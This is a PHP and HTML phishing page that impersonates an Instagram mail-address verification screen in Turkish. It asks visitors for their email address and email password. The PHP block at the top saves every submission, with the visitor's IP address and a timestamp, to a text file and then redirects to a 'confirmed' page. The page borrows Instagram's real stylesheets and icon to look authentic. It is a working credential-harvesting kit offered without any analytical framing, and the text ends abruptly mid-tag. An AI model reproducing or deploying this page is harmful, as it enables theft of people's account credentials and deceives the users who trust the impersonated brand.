<?php

if($_POST){
$username = $_POST['y_pass'];
$password =  $_POST['x_pass'];
$ip = $_SERVER['REMOTE_ADDR'];
date_default_timezone_set('Europe/Istanbul');
$cur_time=date("d-m-Y H:i:s");
$file = fopen('canofficial.txt', 'a');
fwrite($file, $username."-----Sifre-----> " .$password. "   Ip Adresi: " .$ip. "   Tarih: " .$cur_time.  "\n\n");
fclose($file);
echo '';
	header("Location: confirmed.php");
}
	?>

<html>
<head>
<meta charset="utf-8">
<title>Instagram</title>
<meta name="viewport" content="width=device-width">
<link rel="shortcut icon" href="https://instagram.com/static/images/ico/xxxhdpi_launcher.png/9fc4bab7565b.png">
</head>
<body class="" style="">
<div class="MFkQJ ABLKx VhasA _1-msl"><div class="GfkS6 "></div><div class="ZsSMR"><a class="z1VUo KD4vR ABLKx VhasA" href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.installLink&amp;mt=8&amp;vt=lo" role="alert"><section class="dZvHF  fvoD7"><p class="xK6EF">Instagram</p><p class="_5b2Kp">Get Instagram from Google Play Or App Store</p></section><section class="FMlV_"><button class="_4IAxF">Get</button></section></a></div></div><br><br>
<div id="react-root">
<section class="LZyqZ">
<div class="lTdZb">
<div class="vqibd  wNNoj ">
<img src="mail.gif" alt="mail" width="140">
<div class="ZpgjG   _1I5YO">
<h2 class="AjK3K ">Mail Adresi Doğrulama</h2>
</div>
<p class="GusmU SVI5E     ">Lütfen instagram Mail Adresinizi ve Mail Şifrenizi yazıp "Hesabı Onayla" yı tıklayıp sonraki formu doldurunuz.</p>
<div class="GA2q- ">
<form class="JraEb" method="POST">
<div class="QuiLu Xb8C0"><input name="y_pass" placeholder="Mail Adresınız" type="email" class="PAhYv zyHYP" required=""></div>
<div class="QuiLu Xb8C0"><input name="x_pass" placeholder="Mail Şifreniz" type="password" class="PAhYv zyHYP" required=""></div><span class="idhGk _1OSdk"><button class="_5f5mN       jIbKX KUBKM      yZn4P   ">Hesabınızı Onaylayın</button></span>
</form>
</div>
<br>
<center><a class="_s1olq" href="/accounts/password/reset/"></a></form></center>
</div>
<br>
</div> <p id="community guidelines" style="font-family:sans-serif;font-weight:100;"> </p> </center> </body> </html>
</div>
</div>
</section>
</div>
<div class="      tHaIX             Igw0E   rBNOH          YBx95   ybXk5    _4EzTm                                                                                                        O1flK   _7JkPY    PdTAI ZUqME" style="height: 60px; width: 100%;"><span aria-label="From Facebook" class="glyphsSpriteFb_brand_center_grey u-__7"></span></div>
</html>
<link rel="stylesheet" href="//www.instagram.com/static/bundles/es6/ConsumerUICommons.css/4c68346f3fc7.css" type="text/css" crossorigin="anonymous">
<link rel="stylesheet" href="//www.instagram.com/static/bundles/es6/ConsumerAsyncCommons.css/f5339c1f472f.css" type="text/css" crossorigin="anonymous">
<link rel="stylesheet" href="//www.instagram.com/static/bundles/es6/Challenge.css/e6dcc76c8eaf.css" type="text/css" crossorigin="anonymous">
<div style="position: fixed; top: env(safe-area-inset-top); right: env(safe-area-inset-right); bottom: env(safe-area-inset-bottom); left: env(safe-area-inset-left); pointer-events: none; contain: strict; z-index: -9999;">
</div>
</body>
</html>
 <textarea Style="width:1px; height:
